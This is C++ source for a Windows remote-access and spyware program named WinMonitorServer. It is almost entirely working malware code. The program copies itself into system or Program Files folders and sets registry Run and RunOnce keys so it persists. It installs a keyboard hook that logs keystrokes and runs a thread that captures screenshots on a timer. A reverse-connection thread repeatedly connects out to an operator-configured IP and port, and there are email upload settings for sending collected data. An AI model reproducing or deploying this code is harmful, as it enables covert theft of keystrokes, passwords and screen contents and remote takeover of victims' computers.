
bool ClearRevConn(CWinMonitorServicer  **WServer,CTcpNwMonitorConnection **Con)
{
	try
	{
		gbl_ReverseClient=0;
		if(*WServer)
		{
			(*WServer)->StopService();
			delete *WServer;
			*WServer=0;
		}
		if(*Con)
		{
			(*Con)->Disconnect();
			delete *Con;
			*Con=0;
		}
	}
	catch(...) { return false; }
	return true;
}

DWORD WINAPI ReverseConnectionThread(LPVOID Fname)
{
	CTcpNwMonitorConnection *ServerCon=0;
	CWinMonitorServicer *WinServer=0;
	MSG msg;

	do 
	{
		try 
		{ 
			if(WinServer && gbl_lnkdlst_TcpClients.GetItemByAddress((UINT64)WinServer)) continue; 
			WinServer=0; ServerCon=0;
		} 
		catch(...) { WinServer=0; ServerCon=0; }
		
		if(ClearRevConn(&WinServer,&ServerCon),!(WinServer=new CWinMonitorServicer()) || !(ServerCon=new CTcpNwMonitorConnection())) continue;
	
		if(ServerCon->ConnectTo(ServerCon->GetHostIP(gbl_struct_WinMonitorServerConfig.SpReverseConnection->tchrIP),gbl_struct_WinMonitorServerConfig.SpReverseConnection->lngPort))     
		{
			if(!WinServer->ServiceClient(*ServerCon,true,true,false)) continue;
			gbl_lnkdlst_TcpClients.InsertAtBack((void*)WinServer); 
			gbl_ReverseClient=(void*)WinServer;
			gbl_hReverseConnectionThread=0;
			return 0;
		}
	}
	while(Sleep(gbl_struct_WinMonitorServerConfig.SpReverseConnection->fltAttemptInterval*1000),gbl_blnContinueReverseConnection);

	ClearRevConn(&WinServer,&ServerCon);
	gbl_hReverseConnectionThread=0;

	return true;
}

TCHAR *CreateDriveLocationFromTemplateLocation(TCHAR *RootDir,TCHAR *RemainPath)
{
	CGeneralMemoryUtility memuty;
	UINT uintLen=0;
	TCHAR *tchrLowerRootDir=0,*tchrLowerRoot=0;

	try
	{
		if(tchrLowerRootDir=(TCHAR*)AnsiLower((LPSTR)RootDir),!_tcscmp(tchrLowerRootDir,"system"))
		{	 
			tchrLowerRoot=(TCHAR*)memuty.ReAllocateMemory(0,sizeof(TCHAR)*((uintLen=GetSystemDirectory(0,0))+1)); 
			GetSystemDirectory((LPTSTR)tchrLowerRoot,uintLen+1);
		}
		else
		{
			TCHAR tchrPrevCurDir[MAX_PATH];
            GetCurrentDirectory(MAX_PATH,(LPTSTR)tchrPrevCurDir); 

			tchrLowerRoot=(TCHAR*)memuty.ReAllocateMemory(0,sizeof(TCHAR)*((uintLen=GetWindowsDirectory(0,0))+5));
			GetWindowsDirectory((LPTSTR)tchrLowerRoot,uintLen+1);
			_tcscat(tchrLowerRoot,_T("\\..\\"));

			SetCurrentDirectory(tchrLowerRoot); GetCurrentDirectory(uintLen+5,(LPTSTR)tchrLowerRoot); SetCurrentDirectory(tchrPrevCurDir);

			if(!_tcscmp(tchrLowerRootDir,"program files"))
			{
				tchrLowerRoot=(TCHAR*)memuty.ReAllocateMemory(tchrLowerRoot,sizeof(TCHAR)*(_tcslen(tchrLowerRoot)+14));
				_tcscat(tchrLowerRoot,"program files");
			}
			else
			if(!_tcscmp(tchrLowerRootDir,"common files"))
			{
				tchrLowerRoot=(TCHAR*)memuty.ReAllocateMemory(tchrLowerRoot,sizeof(TCHAR)*(_tcslen(tchrLowerRoot)+27));
		    	_tcscat(tchrLowerRoot,"program files\\common files");
			}
		}
		if((tchrLowerRootDir=new TCHAR[250])==0) return false;

	   _tcscpy(tchrLowerRootDir,RemainPath);
		tchrLowerRoot=(TCHAR*)memuty.ReAllocateMemory(tchrLowerRoot,(_tcslen(tchrLowerRoot)+_tcslen(tchrLowerRootDir)+1)*sizeof(TCHAR));
	   _tcscat(tchrLowerRoot,tchrLowerRootDir);
	   try{ delete []tchrLowerRootDir;} catch(...){}
	   return tchrLowerRoot;
  }
  catch(...) { return (TCHAR*)0; }
}

TCHAR *AttachAnotherFileName(TCHAR *FullFileName,TCHAR *AnotherFileName)
{
	CGeneralMemoryUtility memUty;
	try
	{
		int indxOfSlash=memUty.GetLastIndexOfFileSlash(FullFileName);
		if(indxOfSlash==-1) return 0;
		TCHAR *tchrNew=new TCHAR[sizeof(TCHAR)*(indxOfSlash+1+_tcslen(AnotherFileName)+1)];
		memUty.AllocateMem(&tchrNew,FullFileName,indxOfSlash+1,false);
		TCHAR *tchrDblPtr=tchrNew+indxOfSlash+1;
		memUty.AllocateMem(&tchrDblPtr,AnotherFileName,_tcslen(AnotherFileName),false); 
		return tchrNew;
	}
	catch(...) { return 0; }
}

bool LoadWinMonitorServerConfigurationFromXml(SWinMonitorServerConfiguration &SConfig)
{
	
	memset((void*)&SConfig,0,sizeof(SWinMonitorServerConfiguration));

	CXmlUtility XmlUty;
	if(!XmlUty.OpenXmlDocument(DEF_CONFIG_XML)) return false;
	TCHAR tchrTmp[500];

	//--------General settings

	if(!XmlUty.GetNodeAttributeFromHeirarchy("WinMonitorServer","Date",tchrTmp,true)) return false;
	SConfig.AllocateMem(&SConfig.SGeneral.tchrCreationDate,tchrTmp);
	if(!XmlUty.GetNodeAttributeFromHeirarchy("WinMonitorServer","Time",tchrTmp,true)) return false;
	SConfig.AllocateMem(&SConfig.SGeneral.tchrCreationTime,tchrTmp);

	if(!XmlUty.GetNodeTextFromHeirarchy
	  ("WinMonitorServer/WIN-MONITOR-SERVER/FILE-NAME",tchrTmp,true)) return false;  
	
	SConfig.AllocateMem(&SConfig.SGeneral.tchrFileName,tchrTmp); 

	if(!XmlUty.GetNodeTextFromHeirarchy
	  ("WinMonitorServer/WIN-MONITOR-SERVER/INTERNAL-NAME",tchrTmp,true)) return false;  
	
	SConfig.AllocateMem(&SConfig.SGeneral.tchrInternalName,tchrTmp); 

	if(!XmlUty.GetNodeTextFromHeirarchy
	  ("WinMonitorServer/WIN-MONITOR-SERVER/INSTALL-LOCATION",tchrTmp,true)) return false;  
	
	SConfig.AllocateMem(&SConfig.SGeneral.tchrInstallLocation,tchrTmp); 

	gbl_struct_WinMonitorStoredFiles.tchrExeFullPath=CreateDriveLocationFromTemplateLocation(SConfig.SGeneral.tchrInstallLocation,SConfig.SGeneral.tchrFileName); 

	//--------Registry settings

	if(!XmlUty.GetNodeTextFromHeirarchy
	  ("WinMonitorServer/WIN-MONITOR-SERVER/REGISTRY-SETTINGS/REGISTRY-KEY",tchrTmp,true)) return false;  
	SConfig.AllocateMem(&SConfig.SRegistry.tchrRegKey,tchrTmp); 

	if(!XmlUty.GetNodeAttributeFromHeirarchy 
	  ("WinMonitorServer/WIN-MONITOR-SERVER/REGISTRY-SETTINGS/LOCAL-USER","RUN-ALWAYS",tchrTmp,true)) return false;  

	SConfig.SRegistry.blnLocalUserRunAlways=(tchrTmp[0]==_T('T') || tchrTmp[0]==_T('t'))?true:false;

	if(!XmlUty.GetNodeAttributeFromHeirarchy 
	  ("WinMonitorServer/WIN-MONITOR-SERVER/REGISTRY-SETTINGS/LOCAL-MACHINE","RUN-ALWAYS",tchrTmp,true)) return false;  

	SConfig.SRegistry.blnLocalMachineRunAlways=(tchrTmp[0]==_T('T') || tchrTmp[0]==_T('t'))?true:false;

	if(!XmlUty.GetNodeAttributeFromHeirarchy 
	  ("WinMonitorServer/WIN-MONITOR-SERVER/REGISTRY-SETTINGS/LOCAL-MACHINE","RUN-ONCE",tchrTmp,true)) return false;  

	SConfig.SRegistry.blnLocalMachineRunOnce=(tchrTmp[0]==_T('T') || tchrTmp[0]==_T('t'))?true:false;

	//--------Key Monitor settings

	if(!XmlUty.GetNodeAttributeFromHeirarchy 
	  ("WinMonitorServer/KEY-MONITOR","INCLUDE-DATE",tchrTmp,true)) return false;  
	
	SConfig.SKeyLogger.blnIncludeDate=(tchrTmp[0]==_T('T') || tchrTmp[0]==_T('t'))?true:false;

	if(!XmlUty.GetNodeAttributeFromHeirarchy 
	  ("WinMonitorServer/KEY-MONITOR","INCLUDE-TIME",tchrTmp,true)) return false;  
	
	SConfig.SKeyLogger.blnIncludeTime=(tchrTmp[0]==_T('T') || tchrTmp[0]==_T('t'))?true:false;

	if(!XmlUty.GetNodeAttributeFromHeirarchy 
	  ("WinMonitorServer/KEY-MONITOR","INCLUDE-USER",tchrTmp,true)) return false;  
	
	SConfig.SKeyLogger.blnIncludeUser=(tchrTmp[0]==_T('T') || tchrTmp[0]==_T('t'))?true:false;

	if(!XmlUty.GetNodeAttributeFromHeirarchy 
	  ("WinMonitorServer/KEY-MONITOR","UPLOAD-SIZE",tchrTmp,true)) return false;  
	
	_stscanf(tchrTmp,_T("%d"),&SConfig.SKeyLogger.lngUploadSize); 

	if(!XmlUty.GetNodeTextFromHeirarchy
	  ("WinMonitorServer/KEY-MONITOR/ROOT-DIRECTORY",tchrTmp,true)) return false;  

	SConfig.AllocateMem(&SConfig.SKeyLogger.tchrRootDir,tchrTmp);   

	if(!XmlUty.GetNodeTextFromHeirarchy
	  ("WinMonitorServer/KEY-MONITOR/LOG-FILE-NAME",tchrTmp,true)) return false;  

	SConfig.AllocateMem(&SConfig.SKeyLogger.tchrFilePath,tchrTmp);  

	//--------Screen Monitor settings

	if(!XmlUty.GetNodeAttributeFromHeirarchy 
	  ("WinMonitorServer/SCREEN-MONITOR","FILE-LIMIT",tchrTmp,true)) return false;  
	
	_stscanf(tchrTmp,_T("%d"),&SConfig.SScreenMonitor.lngFileLimit);

	if(!XmlUty.GetNodeTextFromHeirarchy
	  ("WinMonitorServer/SCREEN-MONITOR/ROOT-DIRECTORY",tchrTmp,true)) return false;  

	SConfig.AllocateMem(&SConfig.SScreenMonitor.tchrRootDir,tchrTmp);  

	if(!XmlUty.GetNodeTextFromHeirarchy
	  ("WinMonitorServer/SCREEN-MONITOR/PICTURE-DIRECTORY",tchrTmp,true)) return false;  

	SConfig.AllocateMem(&SConfig.SScreenMonitor.tchrSavePath,tchrTmp);  

	if(!XmlUty.GetNodeAttributeFromHeirarchy 
	  ("WinMonitorServer/SCREEN-MONITOR","TIME-INTERVAL",tchrTmp,true)) return false;  

	long intIntervalBase=1;

	switch(tchrTmp[0])
	{
		case _T('S'):case _T('s'): intIntervalBase=1;break;
		case _T('M'):case _T('m'): intIntervalBase=60;break;
		case _T('H'):case _T('h'): intIntervalBase=60*60;break;
	}

	if(!XmlUty.GetNodeTextFromHeirarchy
	  ("WinMonitorServer/SCREEN-MONITOR/ELAPSING-TIME",tchrTmp,true)) return false;  

	_stscanf(tchrTmp,_T("%d"),&SConfig.SScreenMonitor.lngElapseTimeInSeconds);

	SConfig.SScreenMonitor.lngElapseTimeInSeconds*=intIntervalBase;

	//--------Network Monitor settings

	if(!XmlUty.GetNodeAttributeFromHeirarchy 
	  ("WinMonitorServer/NETWORK-MONITOR","REVERSE-CONNECT",tchrTmp,true)) return false;  

	SConfig.blnReverseConnection=(tchrTmp[0]==_T('T') || tchrTmp[0]==_T('t'))?true:false;

	if(!XmlUty.GetNodeAttributeFromHeirarchy 
	  ("WinMonitorServer/NETWORK-MONITOR","EMAIL",tchrTmp,true)) return false;  

	SConfig.blnEmail=(tchrTmp[0]==_T('T') || tchrTmp[0]==_T('t'))?true:false;

	if(SConfig.blnReverseConnection)
	{
	   SConfig.SpReverseConnection=new SWinMonitorServerReverseConnection;
	   if(!XmlUty.GetNodeTextFromHeirarchy
		 ("WinMonitorServer/NETWORK-MONITOR/REVERSE-CONNECTION/IP",tchrTmp,true)) return false;  

	   SConfig.AllocateMem(&(SConfig.SpReverseConnection->tchrIP),tchrTmp);  

	   if(!XmlUty.GetNodeTextFromHeirarchy
		 ("WinMonitorServer/NETWORK-MONITOR/REVERSE-CONNECTION/PORT",tchrTmp,true)) return false;  
	   
	   _stscanf(tchrTmp,_T("%d"),&(SConfig.SpReverseConnection->lngPort));

	   if(!XmlUty.GetNodeTextFromHeirarchy
		 ("WinMonitorServer/NETWORK-MONITOR/REVERSE-CONNECTION/ATTEMPT-INTERVAL",tchrTmp,true)) return false;  

	   _stscanf(tchrTmp,_T("%f"),&(SConfig.SpReverseConnection->fltAttemptInterval));
	} 
	else SConfig.SpReverseConnection=0;

	if(SConfig.blnEmail)
	{
		SConfig.SpEmail=new SWinMonitorServerEmail;

		if(!XmlUty.GetNodeTextFromHeirarchy
		  ("WinMonitorServer/NETWORK-MONITOR/CONNECTION/EMAIL",tchrTmp,true)) return false;  
		
		SConfig.AllocateMem(&(SConfig.SpEmail->tchrEmail),tchrTmp);  

		if(!XmlUty.GetNodeTextFromHeirarchy
		  ("WinMonitorServer/NETWORK-MONITOR/CONNECTION/EMAIL_SERVER",tchrTmp,true)) return false;  
		
		SConfig.AllocateMem(&(SConfig.SpEmail->tchrEmailServer),tchrTmp);  
	}
	else SConfig.SpEmail=0; 

	if(!XmlUty.GetNodeTextFromHeirarchy
	  ("WinMonitorServer/NETWORK-MONITOR/CONNECTION/HOST",tchrTmp,true)) return false;  

	SConfig.AllocateMem(&SConfig.SNetworkConnection.tchrHostName,tchrTmp);  

	if(!XmlUty.GetNodeTextFromHeirarchy
	  ("WinMonitorServer/NETWORK-MONITOR/CONNECTION/PASSWORD",tchrTmp,true)) return false;  

	SConfig.AllocateMem(&SConfig.SNetworkConnection.tchrPassword,tchrTmp);  

	if(!XmlUty.GetNodeTextFromHeirarchy
	  ("WinMonitorServer/NETWORK-MONITOR/CONNECTION/PORT",tchrTmp,true)) return false;  

	_stscanf(tchrTmp,_T("%d"),&SConfig.SNetworkConnection.lngListenPort);

	return true;
}


bool  GetProcess(DWORD pid,PROCESSENTRY32 &pe32)
{
	HANDLE         hProcessSnap = NULL; 
    bool           bRet=false; 
    

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
    if (hProcessSnap == INVALID_HANDLE_VALUE) return false;
	pe32.dwSize = sizeof(PROCESSENTRY32); 

	if (Process32First(hProcessSnap, &pe32)) 
    { 
        do 
        { 
			if(pid==pe32.th32ProcessID)
			{
				bRet =true;
				break;
			}
         } 
        while (Process32Next(hProcessSnap, &pe32)); 
    } 
  
    CloseHandle (hProcessSnap); 
    if(!bRet) return false; else return true;
}


bool IsXMLexists(void)
{
	FILE *Fp=fopen(DEF_CONFIG_XML,"rb");
	if(!Fp) return false;
	fclose(Fp);
	return true;
}

bool ExtractXMLfromEXE(void)
{
	CexeExtraEditor exeEditor;
	return exeEditor.ExtractFileFromHandle(GetModuleHandle(0),_T("WinMonitorConfig"),_T("WinMonitorConfigXML"),_T(DEF_CONFIG_XML));
}

TCHAR *TTrim(TCHAR *tchrStr)
{
	try
	{
		TCHAR *tchrTmp=tchrStr;
		while((*tchrTmp)==_T(' ')) tchrTmp++;
		TCHAR *tchrNewStr=new TCHAR[_tcslen(tchrTmp)+1];
		tchrTmp=tchrNewStr+(_tcslen(_tcscpy(tchrNewStr,tchrTmp))-1);
		while((*tchrTmp)==_T(' ')) *tchrTmp='\0',tchrTmp--;
		return tchrNewStr;
	}
	catch(...) { return tchrStr; }
}

bool MapExeToProperPlace(void)
{
	if(!IsXMLexists()) return false;

	CXmlUtility xmlUty;
	if(!xmlUty.OpenXmlDocument(DEF_CONFIG_XML)) return false;

	TCHAR tchrRoot[30],*tchrLowerRoot=0,*tchrLowerRootDir=new TCHAR[250];
	
	if(!xmlUty.GetNodeTextFromHeirarchy(_T("WinMonitorServer/WIN-MONITOR-SERVER/INSTALL-LOCATION"),tchrRoot,true)) return false;
	if(!xmlUty.GetNodeTextFromHeirarchy(_T("WinMonitorServer/WIN-MONITOR-SERVER/FILE-NAME"),tchrLowerRootDir,true)) return false;

	if(tchrLowerRoot=CreateDriveLocationFromTemplateLocation(tchrRoot,tchrLowerRootDir),!tchrLowerRoot) return false;
	try{ delete []tchrLowerRootDir;} catch(...){}
	
	PROCESSENTRY32 pe32;
	DWORD pid=GetCurrentProcessId();
	CGeneralMemoryUtility memuty;
	UINT uintLen=0;
	TCHAR *tchrTrimLowerRoot=0,*tchrTrimCurDir=0;
	TCHAR *tchrCurDir=(TCHAR*)memuty.ReAllocateMemory(0,sizeof(TCHAR)*((uintLen=GetCurrentDirectory(0,0))+1));
	GetCurrentDirectory(uintLen+1,(LPTSTR)tchrCurDir);
	if(!GetProcess(pid,pe32)) return false;
	else
		if(tchrCurDir=(TCHAR*)memuty.ReAllocateMemory(tchrCurDir,sizeof(TCHAR)*(_tcslen(tchrCurDir)+_tcslen(pe32.szExeFile)+2)),
          _tcscat(_tcscat(tchrCurDir,_T("\\")),pe32.szExeFile),
		!_tcscmp((TCHAR*)AnsiLower((LPSTR)(tchrTrimLowerRoot=TTrim(tchrLowerRoot))),
		         (TCHAR*)AnsiLower((LPSTR)(tchrTrimCurDir=TTrim(tchrCurDir)))))
		{		 
				try{ delete[] tchrLowerRoot; delete []tchrTrimLowerRoot; delete []tchrTrimCurDir; } catch(...) {}
			    try{ memuty.DeleteAll((void**)&tchrCurDir); } catch(...){}
				return true;
		}
	
	if(tchrTrimLowerRoot&&tchrTrimCurDir) try{ delete []tchrTrimLowerRoot; delete []tchrTrimCurDir; } catch(...) {}

	TCHAR prevChr=0;

	prevChr=tchrLowerRoot[uintLen=(memuty.GetLastIndexOfFileSlash(tchrLowerRoot)+1)];
	tchrLowerRoot[uintLen]=_T('\0');

	if(!memuty.CreatePathFromRoot(tchrLowerRoot))
	{
		try{ memuty.DeleteAll((void**)&tchrCurDir);memuty.DeleteAll((void**)&tchrLowerRoot); } catch(...){}
		return false;
	}
	tchrLowerRoot[uintLen+1]=prevChr;

	if(!CopyFile(tchrCurDir,tchrLowerRoot,false))
	{
		try{ memuty.DeleteAll((void**)&tchrCurDir);memuty.DeleteAll((void**)&tchrLowerRoot); } catch(...){}
		return false;
	}
    TCHAR tchrpid[10]; _stprintf(tchrpid,"%u",pe32.th32ProcessID);
	TCHAR *Param=new TCHAR[sizeof(TCHAR)*(_tcslen(tchrCurDir)+_tcslen(tchrpid)+2)]; 
	_tcscat(_tcscat(_tcscpy((TCHAR*)Param,tchrCurDir),"|"),tchrpid);
	if(((int)ShellExecute(0,"open",tchrLowerRoot,(LPCSTR)Param,0,0))>32)
	{
		try{ delete []Param; memuty.DeleteAll((void**)&tchrLowerRoot); memuty.DeleteAll((void**)&tchrCurDir);} catch(...){}
		while(true) Sleep(10000);
		return true;
	}
	else
	{
		try{ delete []Param; memuty.DeleteAll((void**)&tchrLowerRoot); memuty.DeleteAll((void**)&tchrCurDir);} catch(...){}
		return false;
	}
}

bool CreateKeyLogFile(void)
{
	TCHAR *tchrKeyLogFile=CreateDriveLocationFromTemplateLocation(
	gbl_struct_WinMonitorServerConfig.SKeyLogger.tchrRootDir,
	gbl_struct_WinMonitorServerConfig.SKeyLogger.tchrFilePath);  

	if(!tchrKeyLogFile) return false;
	TCHAR *tchrKeyPath=0,*tchrKeyFile=0;
	
	CGeneralMemoryUtility memuty;

	if(!memuty.SplitToPathAndFileName(tchrKeyLogFile,&tchrKeyPath,&tchrKeyFile)) return false;

	if(!memuty.CreatePathFromRoot(tchrKeyPath)) return false;

	FILE *f=fopen(tchrKeyLogFile,"a+");

	memuty.DeleteAll((void**)&tchrKeyPath); 
	memuty.DeleteAll((void**)&tchrKeyFile); 

	gbl_struct_WinMonitorStoredFiles.tchrKeyLogFile=tchrKeyLogFile;

	if(!f) return false;
	fclose(f);
	return true;
}


bool CreateScreenShotDir(void)
{
	gbl_struct_WinMonitorStoredFiles.tchrScreenShotDir=
	CreateDriveLocationFromTemplateLocation(
	gbl_struct_WinMonitorServerConfig.SScreenMonitor.tchrRootDir,
	gbl_struct_WinMonitorServerConfig.SScreenMonitor.tchrSavePath);  

	CGeneralMemoryUtility memuty;

	if(!memuty.CreatePathFromRoot(gbl_struct_WinMonitorStoredFiles.tchrScreenShotDir)) return false;
	else return true;
}


bool UpdateRegistry(void)
{
	struct HKEY__ *hKey;
	unsigned long  hKeyResult;

	if(gbl_struct_WinMonitorServerConfig.SRegistry.blnLocalMachineRunAlways)
	{
		if(RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		              0,0,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,0,&hKey,&hKeyResult)!=ERROR_SUCCESS) return false;

 	}
	else if(gbl_struct_WinMonitorServerConfig.SRegistry.blnLocalMachineRunOnce) 
	{
		if(RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
		   0,0,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,0,&hKey,&hKeyResult)!=ERROR_SUCCESS) return false;
	}
    
	if( gbl_struct_WinMonitorServerConfig.SRegistry.blnLocalMachineRunAlways ||
        gbl_struct_WinMonitorServerConfig.SRegistry.blnLocalMachineRunOnce    )
			if(RegSetValueEx(hKey,gbl_struct_WinMonitorServerConfig.SRegistry.tchrRegKey, 
			  (DWORD)0,(DWORD)REG_SZ,(BYTE*)gbl_struct_WinMonitorStoredFiles.tchrExeFullPath,
			   sizeof(TCHAR) * _tcslen(gbl_struct_WinMonitorStoredFiles.tchrExeFullPath))!=ERROR_SUCCESS) return false;
			else RegCloseKey(hKey);
	
	if(gbl_struct_WinMonitorServerConfig.SRegistry.blnLocalUserRunAlways)
	{
		if(RegCreateKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		              0,0,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,0,&hKey,&hKeyResult)!=ERROR_SUCCESS) return false;

		if(RegSetValueEx(hKey,gbl_struct_WinMonitorServerConfig.SRegistry.tchrRegKey, 
				(DWORD)0,(DWORD)REG_SZ,(BYTE*)gbl_struct_WinMonitorStoredFiles.tchrExeFullPath,
				 sizeof(TCHAR) * _tcslen(gbl_struct_WinMonitorStoredFiles.tchrExeFullPath))!=ERROR_SUCCESS) return false;

		RegCloseKey(hKey);
	}
	return true;
}

bool SetKeyBoardHook(void)
{
	if(!WritePrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_FILE,gbl_struct_WinMonitorStoredFiles.tchrKeyLogFile,DEF_INI_FILE_NAME)) return false;  
	if(!WritePrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_INC_DATE,gbl_struct_WinMonitorServerConfig.SKeyLogger.blnIncludeDate?"T":"F",DEF_INI_FILE_NAME)) return false;  
	if(!WritePrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_INC_TIME,gbl_struct_WinMonitorServerConfig.SKeyLogger.blnIncludeTime?"T":"F",DEF_INI_FILE_NAME)) return false;  
	if(!WritePrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_INC_USER,gbl_struct_WinMonitorServerConfig.SKeyLogger.blnIncludeUser?"T":"F",DEF_INI_FILE_NAME)) return false;  
	
	if(!InstallKBrdHook) 
		return false;
	else 
		return InstallKBrdHook();
}

bool UnInstallKeyBoardHook(void)
{
	if(!UnInstallKBrdHook) 
		return false;
	else 
		return UnInstallKBrdHook();
}


DWORD WINAPI ScreenSnatcherThread(LPVOID Fname)
{
	int intStart=0,intEnd=gbl_struct_WinMonitorServerConfig.SScreenMonitor.lngFileLimit;   
	long lngElapseTime=gbl_struct_WinMonitorServerConfig.SScreenMonitor.lngElapseTimeInSeconds; 

	CDesktopPlugin ScreenMonitor;
	if(!ScreenMonitor.IsValid()) return -1; 
	
	ScreenMonitor.SetCompression(SCREEN_MONITOR_COMPRESS_LZSS);

	TCHAR *tchrFileCur=new TCHAR[intEnd];

	while(gbl_blnContinueScreenSnatching)
	{
		if(intStart>=intEnd) intStart=0;
		_stprintf(tchrFileCur,_T("%ld"),intStart);
		TCHAR *tchrCur=new TCHAR[(_tcslen(gbl_struct_WinMonitorStoredFiles.tchrScreenShotDir)
			                     +_tcslen(tchrFileCur)+_tcslen(DEF_PIC_FILE_BASE)+12)*sizeof(TCHAR)];
		
		if(tchrCur)
		{
			_tcscat(_tcscat(_tcscat(_tcscat(_tcscpy(tchrCur,gbl_struct_WinMonitorStoredFiles.tchrScreenShotDir),_T("\\")),DEF_PIC_FILE_BASE),tchrFileCur),_T(".CBMP"));
			ScreenMonitor.CaptureDesktop();
			ScreenMonitor.SaveImageToFile(tchrCur,true);
			try{ delete []tchrCur; } catch(...) {}
		}
		intStart++;
		Sleep(lngElapseTime*1000);
	}
	try{ delete []tchrFileCur; } catch(...) {}
	return 0;
}

bool UnInstallScreenSnatcher(void)
{
	if(gbl_hScreenSnatcherThread)
	{
		gbl_blnContinueScreenSnatching=false;
		DWORD ExitCode;
		if(GetExitCodeThread(gbl_hScreenSnatcherThread,&ExitCode))
			if(ExitCode==STILL_ACTIVE)
				if(WaitForSingleObject(gbl_hScreenSnatcherThread,2000)!=WAIT_OBJECT_0)
					TerminateThread(gbl_hScreenSnatcherThread,0);
				
	}
	gbl_hScreenSnatcherThread=0;
	return true;		
}

bool InstallScreenSnatcher(void)
{
	if(!gbl_hScreenSnatcherThread)
	{
		 gbl_blnContinueScreenSnatching=true;
		 if((gbl_hScreenSnatcherThread=CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)&ScreenSnatcherThread,NULL,NULL,NULL))==0)
			return false;
	}
	return true;
}
//---KeyBrd Hook : WH_KEYBOARD
//  if (cde<0)if(cde!=HC_ACTION)  return CallNextHookEx((HHOOK)MyHook,cde,w,l); 	
//  if(GetKeyStroke(w,&decoded))